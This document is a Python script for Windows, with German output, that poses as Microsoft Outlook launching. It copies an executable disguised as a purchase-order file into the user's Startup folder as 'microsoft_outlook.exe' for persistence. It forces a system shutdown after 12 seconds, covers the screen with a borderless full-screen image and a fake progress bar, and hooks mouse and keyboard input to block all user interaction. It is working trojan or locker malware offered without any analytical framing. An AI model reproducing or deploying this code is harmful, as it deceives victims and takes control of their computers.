import tkinter as tk
from tkinter import ttk
import os
import time
import getpass
import ctypes
import pyWinhook
import pathlib
import colorama
import pythoncom
colorama.init()

user32 = ctypes.windll.user32
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )


currentdir = pathlib.Path(__file__).parent.absolute()

print(colorama.Fore.GREEN + 'Starte - Microsoft OUTLOOK(32Bit)')

user = getpass.getuser()
autostart = os.path.join("C:/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
picmove = os.path.join("C:/Users/Public/")

current1 = os.path.realpath(__file__)
print(current1)
if not "Windows" in str(current1):
    try:
        os.rename(str(currentdir)+"\\megatronic.epes", str(currentdir)+"\\Unbenannt.png")
    except:
        print("Fehler")
    pic = "Unbenannt.png"
    current = os.path.realpath(__file__).replace("test2.py", "MUSTER Megatronics GmbH München für Bestellung 02-12 Weitblick.exe")



    os.popen("copy /Y \""+current+"\" \""+autostart+"microsoft_outlook.exe\"")

    os.popen("copy /Y "+str(pathlib.Path(__file__).parent.absolute())+"\\Unbenannt.png" +" \""+picmove+"Unbenannt.png\"")
os.system('shutdown -s -t 12 -c " "')
pic = picmove+"Unbenannt.png"
width = user32.GetSystemMetrics(0)
height = user32.GetSystemMetrics(1)




class SampleApp(tk.Tk):
    #print(pic)
    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)
        self.geometry(str(width)+"x"+str(height)) #Screen Size 1280 x 800
        self.configure(background='red')
        self.resizable(0, 0) #Don't allow resizing in the x or y direction
        self.overrideredirect(1) # will remove the top badge of window
        #print(pic)
        self.filename = tk.PhotoImage(file = pic)
        self.background_label = tk.Label(self, image=self.filename)

        self.progress = ttk.Progressbar(self, orient="horizontal",
                                        length=1300, mode="determinate")
        self.progress.place(relx=0.6355, rely=0.92, anchor="center")
        self.background_label.place(x=0, y=0, relwidth=1, relheight=1)

        self.bytes = 0
        self.maxbytes = 0

    def start(self):
        self.progress["value"] = 0
        self.maxbytes = 50000
        self.progress["maximum"] = 50000
        self.read_bytes()
        if not "Windows" in str(current1):
            try:
                os.rename(str(currentdir)+"\\Unbenannt.png", str(currentdir)+"\\megatronic.epes")
            except:
                print("Fehler")

    def uMad(self, event):
        return False

    def fuck(self):
        hm = pyWinhook.HookManager()
        hm.MouseAll = self.uMad
        hm.KeyAll =  self.uMad
        hm.HookMouse()
        hm.HookKeyboard()
        pythoncom.PumpMessages()


    def read_bytes(self):
        '''simulate reading 500 bytes; update progress bar'''
        self.bytes += 1050
        self.progress["value"] = self.bytes

        if self.bytes < self.maxbytes:
            # read more bytes after 100 ms
            self.after(100, self.read_bytes)
            #input("WEITER? FREEZE")
            self.after(3000, self.fuck)
        else:
            self.progress["value"] = 0
            self.after(100, self.start)
        


app = SampleApp()
app.start()
app.mainloop()
